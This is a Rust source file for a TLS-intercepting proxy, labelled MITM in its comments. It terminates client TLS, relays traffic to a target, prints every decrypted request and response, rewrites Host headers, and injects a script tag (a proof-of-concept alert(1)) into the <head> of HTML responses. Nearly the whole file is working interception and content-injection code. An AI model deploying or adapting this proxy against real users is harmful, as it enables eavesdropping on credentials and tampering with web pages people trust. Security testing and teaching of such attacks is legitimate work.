use std::error::Error;
use tokio::io::AsyncReadExt;
use tokio::io::AsyncWriteExt;
use tokio::net::TcpListener;
use tokio::net::TcpStream;
use tokio_rustls::TlsAcceptor;
use tokio_rustls::TlsConnector;
use tokio_rustls::rustls::ServerName;
use std::sync::Arc;
use std::convert::TryFrom;

use crate::tls::{generate_tls_acceptor, generate_tls_connector, MaybeTlsStream};

pub async fn start_ssl_proxy(server_address: &str, target_address: &str, ssl_issuer: &str) -> Result<(), Box<dyn Error>> {
    let acceptor = generate_tls_acceptor(ssl_issuer)?;
    let listener = TcpListener::bind(server_address).await?;

    while let Ok((stream, _)) = listener.accept().await {
        let ip = stream.peer_addr().unwrap().ip();
        let port = stream.peer_addr().unwrap().port();
        println!("{ip}:{port} - Accepted a new TLS connection");

        let acceptor = acceptor.clone();
        let target_address = target_address.to_string();

        tokio::spawn(async move {
            if let Err(e) = handle_connection(acceptor, stream, target_address).await {
                eprintln!("Error handling connection: {:?}", e);
            }
        });
    }

    Ok(())
}

async fn handle_connection(acceptor: TlsAcceptor, stream: TcpStream, target_address: String) -> Result<(), Box<dyn Error>> {
    println!("Accepted connection from client.");

    // Accept TLS connection from client
    let mut client_stream = acceptor.accept(stream).await?;
    println!("TLS handshake with client successful.");

    let (trim_target_address, domain, is_target_https) = {
        let trim_target_address = target_address.trim_start_matches("https://").trim_start_matches("http://");
        let is_target_https = target_address.starts_with("https://");
        let domain = trim_target_address.split(':').next().ok_or("Invalid target address")?.to_string();

        (trim_target_address, domain.to_string(), is_target_https)
    };

    let mut server_stream = if is_target_https {
        println!("Connecting to target (TLS): {}", trim_target_address);

        let connector = generate_tls_connector()?;
        let server_name = ServerName::try_from(domain.as_str()).map_err(|_| "Invalid domain for ServerName")?;

        let stream = TcpStream::connect(trim_target_address).await?;

        let server_stream = TlsConnector::from(Arc::new(connector)).connect(server_name, stream).await?;
        println!("TLS handshake with server successful.");

        MaybeTlsStream::Tls(server_stream)
    } else {
        println!("Connecting to target (plain): {}", trim_target_address);

        let server_stream = TcpStream::connect(trim_target_address).await?;
        println!("Connected to target (plain).");

        MaybeTlsStream::Plain(server_stream)
    };

    let mut client_to_server_buffer = vec![0u8; 4096];
    let mut server_to_client_buffer = vec![0u8; 4096];

    loop {
        tokio::select! {
            client_read = client_stream.read(&mut client_to_server_buffer) => {
                let n = client_read?;
                if n == 0 {
                    println!("Client closed the connection.");
                    break;
                }
                println!("Read {} bytes from client", n);

                // Parse and modify the HTTP request header - MITM MITM
                if let Ok(decoded) = std::str::from_utf8(&client_to_server_buffer[..n]) {
                    println!("\n\nReceived from client:\n{}\n\n", decoded);
                    let modified_request = modify_host_header(decoded, &domain);
                    server_stream.write_all(modified_request.as_bytes()).await?;
                } else {
                    server_stream.write_all(&client_to_server_buffer[..n]).await?;
                }

                println!("Forwarded {} bytes to server.", n);
            }
    
            server_read = server_stream.read(&mut server_to_client_buffer) => {
                match server_read {
                    Ok(n) => {
                        if n == 0 {
                            println!("Server closed the connection.");
                            break;
                        }
                        println!("Read {} bytes from server", n);

                        // Parse and modify the HTTP response - MITM MITM
                        if let Ok(decoded) = std::str::from_utf8(&server_to_client_buffer[..n]) {
                            println!("\n\nReceived from server:\n{}\n\n", decoded);
                            let modified_response = modify_response(decoded);
                            client_stream.write_all(modified_response.as_bytes()).await?;
                        } else {
                            client_stream.write_all(&server_to_client_buffer[..n]).await?;
                        }

                        println!("Forwarded {} bytes to client.", n);
                    }
                    Err(e) => {
                        eprintln!("Failed to read from server: {}", e);
                        break;
                    }
                }
            }
        }
    }

    Ok(())
}

// mitm mitm
fn modify_host_header(request: &str, domain: &str) -> String {
    let mut modified_request = String::new();
    for line in request.lines() {
        if line.starts_with("Host:") {
            modified_request.push_str(&format!("Host: {}\r\n", domain));
            println!("------------ MODIFIED HOST HEADER! ---------------");
            println!("++++ Host: {}\r\n", domain)
        } else {
            modified_request.push_str(line);
            modified_request.push_str("\r\n");
        }
    }
    modified_request
}


// MITM MITM
fn modify_response(response: &str) -> String {
    let mut modified_response = String::new();

    for line in response.lines() {
        if line.contains("<head>") {
            let payload = &format!("<head><script>alert(1)</script>");
            modified_response.push_str(payload);
            println!("------------ MODIFIED WEBSITE! ---------------");
            println!("++++ <head>: {}\r\n", payload)
        }  else {
            modified_response.push_str(line);
            modified_response.push_str("\r\n");
        }
    }

    modified_response
}